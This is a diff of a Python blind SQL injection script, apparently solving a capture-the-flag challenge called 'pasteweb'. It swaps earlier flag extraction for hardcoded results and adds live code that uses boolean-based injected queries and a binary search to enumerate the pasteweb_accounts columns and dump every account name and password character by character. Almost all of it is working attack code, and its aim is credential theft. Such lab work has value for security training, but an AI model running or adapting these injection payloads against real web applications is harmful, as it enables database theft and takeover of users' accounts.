@@ -198,18 +198,110 @@ if __name__ == '__main__':
         lengths_of_column = [4]
         names_of_column = ['fl4g']
         
-        # ------ Check Datas, focus on the column: fl4g ------
+        # # ------ Check Datas, focus on the column: fl4g ------
+        # # Check how many datas in the server
+        # start = 0
+        # end = 200
+        # step = 1
+        # nums_of_datas = BinSearch("' or (select count(*) from s3cr3t_t4b1e) >", start, end, step, headers, url, session)
+        # print(nums_of_datas)
+        
+        # # Check each length of datas
+        # lengths_of_datas = [
+        #     BinSearch(
+        #         f"' or length((select fl4g from s3cr3t_t4b1e limit 1 offset {i})) >",
+        #         start,
+        #         end,
+        #         step,
+        #         headers,
+        #         url,
+        #         session,
+        #     )
+        #     for i in range(nums_of_datas)
+        # ]
+        # print(lengths_of_datas)
+        
+        # # Check each datas
+        # datas = [
+        #     "".join(
+        #         chr(
+        #             BinSearch(
+        #                 f"' or ascii(substr((select fl4g from s3cr3t_t4b1e limit 1 offset {i}),{j+1},1)) >",
+        #                 start,
+        #                 end,
+        #                 step,
+        #                 headers,
+        #                 url,
+        #                 session,
+        #             )
+        #         )
+        #         for j in range(lengths_of_datas[i])
+        #     )
+        #     for i in range(nums_of_datas)
+        # ]
+        # print(datas)
+        nums_of_datas = 1
+        lengths_of_datas = [29]
+        datas = ['FLAG{B1inD_SqL_IiIiiNj3cT10n}']
+        
+        # # ------ Check Column informations, focus on the table: pasteweb_accounts ------
+        # # Check how many column in the server
+        # start = 0
+        # end = 200
+        # step = 1
+        # nums_of_column = BinSearch("' or (select count(*) from information_schema.columns where table_name = 'pasteweb_accounts') >", start, end, step, headers, url, session)
+        # print(nums_of_column)
+        
+        # # Check each length of column
+        # lengths_of_column = [
+        #     BinSearch(
+        #         f"' or length((select column_name from information_schema.columns where table_name = 'pasteweb_accounts' limit 1 offset {i})) >",
+        #         start,
+        #         end,
+        #         step,
+        #         headers,
+        #         url,
+        #         session,
+        #     )
+        #     for i in range(nums_of_column)
+        # ]
+        # print(lengths_of_column)
+        
+        # # Check each name of column
+        # names_of_column = [
+        #     "".join(
+        #         chr(
+        #             BinSearch(
+        #                 f"' or ascii(substr((select column_name from information_schema.columns where table_name = 'pasteweb_accounts' limit 1 offset {i}),{j+1},1)) >",
+        #                 start,
+        #                 end,
+        #                 step,
+        #                 headers,
+        #                 url,
+        #                 session,
+        #             )
+        #         )
+        #         for j in range(lengths_of_column[i])
+        #     )
+        #     for i in range(nums_of_column)
+        # ]
+        # print(names_of_column)
+        nums_of_column = 3
+        lengths_of_column = [7, 12, 13]
+        names_of_column = ['user_id', 'user_account', 'user_password']
+        
+        # ------ Check Datas, focus on the column: user_account ------
         # Check how many datas in the server
         start = 0
         end = 200
         step = 1
-        nums_of_datas = BinSearch("' or (select count(*) from s3cr3t_t4b1e) >", start, end, step, headers, url, session)
+        nums_of_datas = BinSearch("' or (select count(*) from pasteweb_accounts) >", start, end, step, headers, url, session)
         print(nums_of_datas)
         
         # Check each length of datas
         lengths_of_datas = [
             BinSearch(
-                f"' or length((select fl4g from s3cr3t_t4b1e limit 1 offset {i})) >",
+                f"' or length((select user_account from pasteweb_accounts limit 1 offset {i})) >",
                 start,
                 end,
                 step,
@@ -226,7 +318,7 @@ if __name__ == '__main__':
             "".join(
                 chr(
                     BinSearch(
-                        f"' or ascii(substr((select fl4g from s3cr3t_t4b1e limit 1 offset {i}),{j+1},1)) >",
+                        f"' or ascii(substr((select user_account from pasteweb_accounts limit 1 offset {i}),{j+1},1)) >",
                         start,
                         end,
                         step,
@@ -240,6 +332,46 @@ if __name__ == '__main__':
             for i in range(nums_of_datas)
         ]
         print(datas)
-        # nums_of_datas = 1
-        # lengths_of_datas = [29]
-        # datas = ['FLAG{B1inD_SqL_IiIiiNj3cT10n}']
+        
+        # ------ Check Datas, focus on the column: user_password ------
+        # Check how many datas in the server
+        start = 0
+        end = 200
+        step = 1
+        nums_of_datas = BinSearch("' or (select count(*) from pasteweb_accounts) >", start, end, step, headers, url, session)
+        print(nums_of_datas)
+        
+        # Check each length of datas
+        lengths_of_datas = [
+            BinSearch(
+                f"' or length((select user_password from pasteweb_accounts limit 1 offset {i})) >",
+                start,
+                end,
+                step,
+                headers,
+                url,
+                session,
+            )
+            for i in range(nums_of_datas)
+        ]
+        print(lengths_of_datas)
+        
+        # Check each datas
+        datas = [
+            "".join(
+                chr(
+                    BinSearch(
+                        f"' or ascii(substr((select user_password from pasteweb_accounts limit 1 offset {i}),{j+1},1)) >",
+                        start,
+                        end,
+                        step,
+                        headers,
+                        url,
+                        session,
+                    )
+                )
+                for j in range(lengths_of_datas[i])
+            )
+            for i in range(nums_of_datas)
+        ]
+        print(datas)
